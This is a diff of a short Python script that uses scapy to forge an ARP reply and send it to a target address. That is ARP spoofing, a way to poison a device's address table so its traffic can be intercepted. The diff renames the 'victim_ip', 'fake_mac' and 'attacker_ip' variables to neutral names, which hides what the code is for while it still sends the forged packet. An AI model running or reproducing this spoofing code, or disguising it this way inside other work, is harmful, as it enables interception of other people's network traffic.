@@ -2,15 +2,15 @@
 from scapy.all import ARP, Ether, send
 
 
-victim_ip = "10.33.67.174"
+stan_ip = "10.33.67.174"
 
-fake_mac = "f2:39:c5:c0:07:e5"
+mac_stan = "f2:39:c5:c0:07:e5"
 
-attacker_ip = "10.33.73.77"  
+mon_ip = "10.33.73.77"  
 
 
-arp_response = ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst=fake_mac)
-ether = Ether(dst=fake_mac) / arp_response
+arp_response = ARP(op=2, pdst=stan_ip, psrc=mon_ip, hwdst=mac_stan)
+ether = Ether(dst=mac_stan) / arp_response
 
 
 send(ether, verbose=0)
